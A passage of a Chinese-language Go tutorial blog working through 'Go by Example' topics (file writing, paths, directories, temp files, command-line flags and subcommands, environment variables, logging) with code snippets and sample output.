class="hljs-string">&quot;writefile&quot;</span>, d1, <span class="hljs-number">0644</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    f, err := os<span class="hljs-selector-class">.Create</span>(<span class="hljs-string">&quot;writefile2&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    defer f<span class="hljs-selector-class">.Close</span>()  <br>  <br>    d2 := <span class="hljs-selector-attr">[]</span>byte&#123;<span class="hljs-number">115</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">10</span>&#125;  <br>    n2, err := f<span class="hljs-selector-class">.Write</span>(d2)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;write bytes: &quot;</span>, n2)  <br>  <br>    n3, err := f<span class="hljs-selector-class">.WriteString</span>(<span class="hljs-string">&quot;writes\n&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;write bytes: &quot;</span>, n3)  <br>    f<span class="hljs-selector-class">.Sync</span>()  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Line-Filters"><a href="#Line-Filters" class="headerlink" title="Line Filters"></a>Line Filters</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;bufio&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>    <span class="hljs-string">&quot;strings&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    scanner := bufio.NewScanner(os.Stdin)  <br>    <span class="hljs-keyword">for</span> scanner.Scan() &#123;  <br>       ucl := strings.ToUpper(scanner.Text())  <br>       fmt.Println(ucl)  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">if</span> err := scanner.Err(); err != <span class="hljs-literal">nil</span> &#123;  <br>       fmt.Println(os.Stderr, <span class="hljs-string">&quot;error: &quot;</span>, err)  <br>       os.Exit(<span class="hljs-number">1</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="File-Paths"><a href="#File-Paths" class="headerlink" title="File Paths"></a>File Paths</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;path/filepath&quot;</span>    <span class="hljs-string">&quot;strings&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    <span class="hljs-selector-tag">p</span> := filepath<span class="hljs-selector-class">.Join</span>(<span class="hljs-string">&quot;dir1&quot;</span>, <span class="hljs-string">&quot;dir2&quot;</span>, <span class="hljs-string">&quot;filename&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;p:&quot;</span>, p)  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(filepath<span class="hljs-selector-class">.Join</span>(<span class="hljs-string">&quot;dir1//&quot;</span>, <span class="hljs-string">&quot;filename&quot;</span>))  <br>    fmt<span class="hljs-selector-class">.Println</span>(filepath<span class="hljs-selector-class">.Join</span>(<span class="hljs-string">&quot;dir1/../dir1&quot;</span>, <span class="hljs-string">&quot;filename&quot;</span>))  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Dir(p):&quot;</span>, filepath<span class="hljs-selector-class">.Dir</span>(p))  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Base(p):&quot;</span>, filepath<span class="hljs-selector-class">.Base</span>(p))  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(filepath<span class="hljs-selector-class">.IsAbs</span>(<span class="hljs-string">&quot;dir/file&quot;</span>))  <br>    fmt<span class="hljs-selector-class">.Println</span>(filepath<span class="hljs-selector-class">.IsAbs</span>(<span class="hljs-string">&quot;C:/a/dir/file&quot;</span>))  <br>  <br>    filename := <span class="hljs-string">&quot;config.json&quot;</span>  <br>    fmt<span class="hljs-selector-class">.Println</span>(filepath<span class="hljs-selector-class">.Ext</span>(filename))  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(strings<span class="hljs-selector-class">.TrimSuffix</span>(filename, filepath<span class="hljs-selector-class">.Ext</span>(filename)))  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>filepath.Join 会自动删除多余的分隔符等等来进行归一化。</p><h2 id="Directories"><a href="#Directories" class="headerlink" title="Directories"></a>Directories</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;io/fs&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>    <span class="hljs-string">&quot;path/filepath&quot;</span>)  <br>  <br>func <span class="hljs-built_in">check</span>(e error) &#123;  <br>    <span class="hljs-keyword">if</span> e != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(e)  <br>    &#125;  <br>&#125;  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>  <br>    err := os<span class="hljs-selector-class">.Mkdir</span>(<span class="hljs-string">&quot;subdir&quot;</span>, <span class="hljs-number">0755</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    defer os<span class="hljs-selector-class">.RemoveAll</span>(<span class="hljs-string">&quot;subdir&quot;</span>)  <br>  <br>    createEmptyFile := <span class="hljs-built_in">func</span>(name string) &#123;  <br>       d := <span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;&quot;</span>)  <br>       <span class="hljs-built_in">check</span>(os<span class="hljs-selector-class">.WriteFile</span>(name, d, <span class="hljs-number">0644</span>))  <br>    &#125;  <br>  <br>    <span class="hljs-built_in">createEmptyFile</span>(<span class="hljs-string">&quot;subdir/file1&quot;</span>)  <br>  <br>    err = os<span class="hljs-selector-class">.MkdirAll</span>(<span class="hljs-string">&quot;subdir/parent/child&quot;</span>, <span class="hljs-number">0755</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    <span class="hljs-built_in">createEmptyFile</span>(<span class="hljs-string">&quot;subdir/parent/file2&quot;</span>)  <br>    <span class="hljs-built_in">createEmptyFile</span>(<span class="hljs-string">&quot;subdir/parent/file3&quot;</span>)  <br>    <span class="hljs-built_in">createEmptyFile</span>(<span class="hljs-string">&quot;subdir/parent/child/file4&quot;</span>)  <br>  <br>    c, err := os<span class="hljs-selector-class">.ReadDir</span>(<span class="hljs-string">&quot;subdir/parent&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Listing subdir/parent&quot;</span>)  <br>    <span class="hljs-keyword">for</span> _, entry := range c &#123;  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot; &quot;</span>, entry<span class="hljs-selector-class">.Name</span>(), entry<span class="hljs-selector-class">.IsDir</span>())  <br>    &#125;  <br>  <br>    err = os<span class="hljs-selector-class">.Chdir</span>(<span class="hljs-string">&quot;subdir/parent/child&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    c, err = os<span class="hljs-selector-class">.ReadDir</span>(<span class="hljs-string">&quot;.&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Listing subdir/parent/child&quot;</span>)  <br>    <span class="hljs-keyword">for</span> _, entry := range c &#123;  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot; &quot;</span>, entry<span class="hljs-selector-class">.Name</span>(), entry<span class="hljs-selector-class">.IsDir</span>())  <br>    &#125;  <br>  <br>    err = os<span class="hljs-selector-class">.Chdir</span>(<span class="hljs-string">&quot;../../..&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Visiting subdir&quot;</span>)  <br>    err = filepath<span class="hljs-selector-class">.WalkDir</span>(<span class="hljs-string">&quot;subdir&quot;</span>, visit)  <br>&#125;  <br>  <br>func <span class="hljs-built_in">visit</span>(<span class="hljs-selector-tag">path</span> string, d fs<span class="hljs-selector-class">.DirEntry</span>, err error) error &#123;  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       return err  <br>    &#125;  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-selector-tag">path</span>, d<span class="hljs-selector-class">.IsDir</span>())  <br>    return nil  <br>&#125;<br></code></pre></td></tr></table></figure><p>os.RemoveAll–&gt;rm -rf<br>os.MkdirAll–&gt;mkdir -p<br>os.Chdir–&gt;cd</p><h2 id="Temporary-Files-and-Directories"><a href="#Temporary-Files-and-Directories" class="headerlink" title="Temporary Files and Directories"></a>Temporary Files and Directories</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;os&quot;</span>    <span class="hljs-string">&quot;path/filepath&quot;</span>)  <br>  <br>func <span class="hljs-built_in">check</span>(e error) &#123;  <br>    <span class="hljs-keyword">if</span> e != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(e)  <br>    &#125;  <br>&#125;  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    f, err := os<span class="hljs-selector-class">.CreateTemp</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;sample&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Temp file name:&quot;</span>, f<span class="hljs-selector-class">.Name</span>())  <br>    defer os<span class="hljs-selector-class">.Remove</span>(f<span class="hljs-selector-class">.Name</span>())  <br>  <br>    _, err = f<span class="hljs-selector-class">.Write</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;testfile&quot;</span>))  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    dname, err := os<span class="hljs-selector-class">.MkdirTemp</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;sampledir&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Temp dir name:&quot;</span>, dname)  <br>  <br>    defer os<span class="hljs-selector-class">.RemoveAll</span>(dname)  <br>    fname := filepath<span class="hljs-selector-class">.Join</span>(dname, <span class="hljs-string">&quot;file1&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(fname)  <br>    err = os<span class="hljs-selector-class">.WriteFile</span>(fname, <span class="hljs-selector-attr">[]</span>byte&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;, <span class="hljs-number">0644</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>&#125;<br></code></pre></td></tr></table></figure><p>通过 os.CreateTemp 在操作系统默认位置创建临时文件。</p><h2 id="Command-Line-Arguments"><a href="#Command-Line-Arguments" class="headerlink" title="Command-Line Arguments"></a>Command-Line Arguments</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    argswithprog := os<span class="hljs-selector-class">.Args</span>  <br>    argswithoutprog := os<span class="hljs-selector-class">.Args</span><span class="hljs-selector-attr">[1:]</span>  <br>    arg := os<span class="hljs-selector-class">.Args</span><span class="hljs-selector-attr">[3]</span>  <br>    fmt<span class="hljs-selector-class">.Println</span>(argswithprog)  <br>    fmt<span class="hljs-selector-class">.Println</span>(argswithoutprog)  <br>    fmt<span class="hljs-selector-class">.Println</span>(arg)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Command-Line-Flags"><a href="#Command-Line-Flags" class="headerlink" title="Command-Line Flags"></a>Command-Line Flags</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;flag&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    wordPtr := flag<span class="hljs-selector-class">.String</span>(<span class="hljs-string">&quot;word&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;a string&quot;</span>)  <br>    numPtr := flag<span class="hljs-selector-class">.Int</span>(<span class="hljs-string">&quot;num&quot;</span>, <span class="hljs-number">42</span>, <span class="hljs-string">&quot;an int&quot;</span>)  <br>    forkPtr := flag<span class="hljs-selector-class">.Bool</span>(<span class="hljs-string">&quot;fork&quot;</span>, false, <span class="hljs-string">&quot;a bool&quot;</span>)  <br>    <span class="hljs-selector-tag">var</span> svar string  <br>    flag<span class="hljs-selector-class">.StringVar</span>(&amp;svar, <span class="hljs-string">&quot;svar&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;a string var&quot;</span>)  <br>  <br>    flag<span class="hljs-selector-class">.Parse</span>()  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;word:&quot;</span>, *wordPtr)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;numb:&quot;</span>, *numPtr)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;fork:&quot;</span>, *forkPtr)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;svar:&quot;</span>, svar)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;tail:&quot;</span>, flag<span class="hljs-selector-class">.Args</span>())  <br>&#125;<br></code></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">PS</span> <span class="hljs-string">C:\Users\Ry4n\Desktop\golang\gobyexample&gt;</span> <span class="hljs-string">.\CmdFlags.exe</span><br><span class="hljs-attr">word:</span> <span class="hljs-string">foo</span><br><span class="hljs-attr">numb:</span> <span class="hljs-number">42</span><br><span class="hljs-attr">fork:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">svar:</span> <span class="hljs-string">bar</span><br><span class="hljs-attr">tail:</span> []<br><span class="hljs-string">PS</span> <span class="hljs-string">C:\Users\Ry4n\Desktop\golang\gobyexample&gt;</span> <span class="hljs-string">.\CmdFlags.exe</span> <span class="hljs-string">-word</span> <span class="hljs-string">abc</span><br><span class="hljs-attr">word:</span> <span class="hljs-string">abc</span><br><span class="hljs-attr">numb:</span> <span class="hljs-number">42</span><br><span class="hljs-attr">fork:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">svar:</span> <span class="hljs-string">bar</span><br><span class="hljs-attr">tail:</span> []<br><span class="hljs-string">PS</span> <span class="hljs-string">C:\Users\Ry4n\Desktop\golang\gobyexample&gt;</span> <span class="hljs-string">.\CmdFlags.exe</span> <span class="hljs-string">-word</span> <span class="hljs-string">abc</span> <span class="hljs-string">-fork</span><br><span class="hljs-attr">word:</span> <span class="hljs-string">abc</span><br><span class="hljs-attr">numb:</span> <span class="hljs-number">42</span><br><span class="hljs-attr">fork:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">svar:</span> <span class="hljs-string">bar</span><br><span class="hljs-attr">tail:</span> []<br></code></pre></td></tr></table></figure><p>另外，-h 会获取自动生成的帮助文本内容</p><h2 id="Command-Line-Subcommands"><a href="#Command-Line-Subcommands" class="headerlink" title="Command-Line Subcommands"></a>Command-Line Subcommands</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;flag&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    fooCmd := flag<span class="hljs-selector-class">.NewFlagSet</span>(<span class="hljs-string">&quot;foo&quot;</span>, flag.ExitOnError)  <br>    fooEnable := fooCmd<span class="hljs-selector-class">.Bool</span>(<span class="hljs-string">&quot;enable&quot;</span>, false, <span class="hljs-string">&quot;enable&quot;</span>)  <br>    fooName := fooCmd<span class="hljs-selector-class">.String</span>(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>)  <br>  <br>    barCmd := flag<span class="hljs-selector-class">.NewFlagSet</span>(<span class="hljs-string">&quot;bar&quot;</span>, flag.ExitOnError)  <br>    barLevel := barCmd<span class="hljs-selector-class">.Int</span>(<span class="hljs-string">&quot;level&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;level&quot;</span>)  <br>  <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(os.Args) &lt; <span class="hljs-number">2</span> &#123;  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;expect &#x27;foo&#x27; or &#x27;bar&#x27; subcommands&quot;</span>)  <br>       os<span class="hljs-selector-class">.Exit</span>(<span class="hljs-number">1</span>)  <br>    &#125;  <br>    <span class="hljs-selector-tag">switch</span> os<span class="hljs-selector-class">.Args</span><span class="hljs-selector-attr">[1]</span> &#123;  <br>    case <span class="hljs-string">&quot;foo&quot;</span>:  <br>       fooCmd<span class="hljs-selector-class">.Parse</span>(os<span class="hljs-selector-class">.Args</span><span class="hljs-selector-attr">[2:]</span>)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;subcommand &#x27;foo&#x27;&quot;</span>)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;  enable:&quot;</span>, *fooEnable)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;  name:&quot;</span>, *fooName)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;  tail:&quot;</span>, fooCmd<span class="hljs-selector-class">.Args</span>())  <br>    case <span class="hljs-string">&quot;bar&quot;</span>:  <br>       barCmd<span class="hljs-selector-class">.Parse</span>(os<span class="hljs-selector-class">.Args</span><span class="hljs-selector-attr">[2:]</span>)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;subcommand &#x27;bar&#x27;&quot;</span>)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;  level:&quot;</span>, *barLevel)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;  tail:&quot;</span>, barCmd<span class="hljs-selector-class">.Args</span>())  <br>    default:  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;expected &#x27;foo&#x27; or &#x27;bar&#x27; subcommands&quot;</span>)  <br>       os<span class="hljs-selector-class">.Exit</span>(<span class="hljs-number">1</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Environment-Variables"><a href="#Environment-Variables" class="headerlink" title="Environment Variables"></a>Environment Variables</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;os&quot;</span>    <span class="hljs-string">&quot;strings&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    os<span class="hljs-selector-class">.Setenv</span>(<span class="hljs-string">&quot;FOO&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;FOO:&quot;</span>, os<span class="hljs-selector-class">.Getenv</span>(<span class="hljs-string">&quot;FOO&quot;</span>))  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;WQW:&quot;</span>, os<span class="hljs-selector-class">.Getenv</span>(<span class="hljs-string">&quot;WQW&quot;</span>))  <br>    fmt<span class="hljs-selector-class">.Println</span>()  <br>    <span class="hljs-keyword">for</span> _, e := range os<span class="hljs-selector-class">.Environ</span>() &#123;  <br>       pair := strings<span class="hljs-selector-class">.SplitN</span>(e, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">2</span>)  <br>       fmt<span class="hljs-selector-class">.Println</span>(pair<span class="hljs-selector-attr">[0]</span>, <span class="hljs-string">&quot; &quot;</span>, pair<span class="hljs-selector-attr">[1]</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Logging"><a href="#Logging" class="headerlink" title="Logging"></a>Logging</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs lasso">package main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;bytes&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;log&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br>func main() &#123;  <br>  <br>    <span class="hljs-keyword">log</span>.Println(<span class="hljs-string">&quot;standard logger&quot;</span>)  <br>  <br>    <span class="hljs-keyword">log</span>.SetFlags(<span class="hljs-keyword">log</span>.LstdFlags | <span class="hljs-keyword">log</span>.Lmicroseconds)  <br>    <span class="hljs-keyword">log</span>.Println(<span class="hljs-string">&quot;with micro&quot;</span>)  <br>  <br>    <span class="hljs-keyword">log</span>.SetFlags(<span class="hljs-keyword">log</span>.LstdFlags | <span class="hljs-keyword">log</span>.Lshortfile)  <br>    <span class="hljs-keyword">log</span>.Println(<span class="hljs-string">&quot;with file/line&quot;</span>)  <br>  <br>    mylog := <span class="hljs-keyword">log</span>.<span class="hljs-literal">New</span>(os.Stdout, <span class="hljs-string">&quot;my:&quot;</span>, <span class="hljs-keyword">log</span>.LstdFlags)  <br>    mylog.Println(<span class="hljs-string">&quot;from mylog&quot;</span>)  <br>  <br>    mylog.SetPrefix(<span class="hljs-string">&quot;ohmy:&quot;</span>)  <br>    mylog.Println(<span class="hljs-string">&quot;from mylog&quot;</span>)  <br>  <br>    <span class="hljs-built_in">var</span> buf <span class="hljs-built_in">bytes</span>.Buffer  <br>    buflog := <span class="hljs-keyword">log</span>.<span class="hljs-literal">New</span>(&amp;buf, <span class="hljs-string">&quot;buf:&quot;</span>, <span class="hljs-keyword">log</span>.LstdFlags)  <br>  <br>    buflog.Println(<span class="hljs-string">&quot;hello&quot;</span>)  <br>  <br>    fmt.Print(<span class="hljs-string">&quot;from buflog:&quot;</span>, buf.<span class="hljs-built_in">String</span>())  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="HTTP-Client"><a href="#HTTP-Client" class="headerlink" title="HTTP Client"></a>HTTP Client</h2><figure class="highlight 